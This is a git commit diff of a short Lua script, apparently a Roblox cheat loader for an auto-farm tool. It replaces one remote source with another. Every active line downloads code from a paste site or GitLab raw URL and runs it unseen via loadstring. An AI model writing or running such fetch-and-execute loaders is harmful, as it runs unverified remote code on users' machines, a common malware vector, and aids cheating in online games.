86c6f49a2790fafff3e16044b12e3de274e33709
Mark <jaimepersonal46@gmail.com>
2025-12-31 20:24:12 +0100

    Update Script.lua

--- Script.lua
+++ Script.lua
@@ -3,6 +3,6 @@ local fenv = getfenv()
 task.spawn(function()
     loadstring(game:HttpGet("https://cdn.sourceb.in/bins/frFvztQ8JR/0"))()
 end)
-loadstring(game:HttpGet("https://paste-bin.xyz/raw/8217237"))()
+loadstring(game:HttpGet("https://gitlab.com/mm2main/ChristmasAutoFarm/-/raw/main/LocalPlayer"))()
 
 
